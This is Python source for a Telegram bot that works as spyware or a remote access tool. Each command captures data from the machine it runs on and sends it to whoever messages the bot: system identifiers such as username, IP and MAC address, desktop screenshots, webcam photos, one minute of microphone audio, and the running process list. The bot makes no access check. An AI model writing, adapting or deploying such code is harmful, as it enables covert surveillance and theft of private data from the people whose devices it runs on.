import asyncio
from aiogram import Bot
from aiogram.filters import Command
from aiogram.types import Message, FSInputFile
from aiogram import Dispatcher
import getpass
import os
import platform
import socket
from datetime import datetime
from uuid import getnode as get_mac
import psutil
import pyautogui
import pyaudio
import wave
from subprocess import Popen, PIPE
import cv2
from dotenv import load_dotenv

load_dotenv()
api_key = os.getenv("API_KEY")
bot = Bot(token=api_key)
dp = Dispatcher()

autoname = "FILENAME.py"

path = os.path.dirname(os.path.realpath(__file__))
address = os.path.join(path, autoname)

start = datetime.now()
name = getpass.getuser()
ip = socket.gethostbyname(socket.gethostname())
mac = get_mac()
ost = platform.uname()

zone = psutil.boot_time()
time = datetime.fromtimestamp(zone)
cpu = psutil.cpu_freq()
ends = datetime.now()
workspeed = format(ends - start)



@dp.message(Command('check'))
async def cmd_check(message: Message):
    await message.answer("System status: online")

@dp.message(Command('help'))
async def cmd_help(message: Message):
    await message.answer(f'\nCommand List:\n/check - Checking System Status\n/info - System characteristics\n/screen - Desktop screenshot\n/audio - Record audio from a voice recorder for a minute\n/process - List of running processes\n/camera - Make a photo')

@dp.message(Command('info'))
async def cmd_info(message: Message):
    file = open("info.txt", "w")
    file.write(
        f"[================================================]\n  Operating System: {ost.system}\n  Processor: {ost.processor}\n  Username: {name}\n  IP adress: {ip}\n  MAC adress: {mac}\n  Timezone: {time.year}/{time.month}/{time.day} {time.hour}:{time.minute}:{time.second}\n  Work speed: {workspeed}\n  Max Frequency: {cpu.max:.2f} Mhz\n  Min Frequency: {cpu.min:.2f} Mhz\n  Current Frequency: {cpu.current:.2f} Mhz\n[================================================]\n")
    file.close()

    current_path = os.path.join(os.getcwd(), "info.txt")
    document = FSInputFile(current_path)
    await bot.send_document(chat_id=message.from_user.id, document=document)
    file.close()
    os.remove("info.txt")

@dp.message(Command('screen'))
async def cmd_screen(message: Message):
    screen = pyautogui.screenshot("screenshot.jpg")

    current_path = os.path.join(os.getcwd(), "screenshot.jpg")
    photo = FSInputFile(current_path)
    await bot.send_photo(chat_id=message.from_user.id, photo=photo)
    os.remove("screenshot.jpg")

@dp.message(Command('camera'))
async def cmd_camera(message: Message):
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        await message.answer("Error: Could not open webcam")
        exit()
    ret, frame = cap.read()
    if ret:
        cv2.imwrite("captured_image.jpg", frame)
        current_path = os.path.join(os.getcwd(), "captured_image.jpg")
        photo = FSInputFile(current_path)
        await bot.send_photo(chat_id=message.from_user.id, photo=photo)
        os.remove("captured_image.jpg")
    else:
        await message.answer("Failed to capture image")
    cap.release()
    cv2.destroyAllWindows()
@dp.message(Command('audio'))
async def cmd_audio(message: Message):
    chunk = 1024
    formats = pyaudio.paInt16
    channels = 1
    rate = 44100
    second = 60     # SECONDS
    names = "sound.wav"
    p = pyaudio.PyAudio()
    stream = p.open(format=formats,
                    channels=channels,
                    rate=rate,
                    input=True,
                    frames_per_buffer=chunk)
    print("")

    frames = []

    for i in range(0, int(rate / chunk * second)):
        data = stream.read(chunk)
        frames.append(data)

    print("")

    stream.stop_stream()
    stream.close()
    p.terminate()

    wf = wave.open(names, "wb")
    wf.setnchannels(channels)
    wf.setsampwidth(p.get_sample_size(formats))
    wf.setframerate(rate)
    wf.writeframes(b''.join(frames))

    current_path = os.path.join(os.getcwd(), "sound.wav")
    audio = FSInputFile(current_path)

    await bot.send_audio(chat_id=message.from_user.id, audio=audio)
    wf.close()
    os.remove(names)

@dp.message(Command('process'))
async def cmd_process(message: Message):
    process = [line.decode("cp866", "ignore") for line in Popen("tasklist", stdout=PIPE).stdout.readlines()]
    ride = open("process.txt", "w", encoding="utf-8")
    ride.write(' '.join(process))
    ride.close()
    current_path = os.path.join(os.getcwd(), "process.txt")
    current = FSInputFile(current_path)
    await bot.send_document(chat_id=message.from_user.id, document=current)
    ride.close()
    os.remove("process.txt")

async def main():
    await dp.start_polling(bot)
if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("EXIT")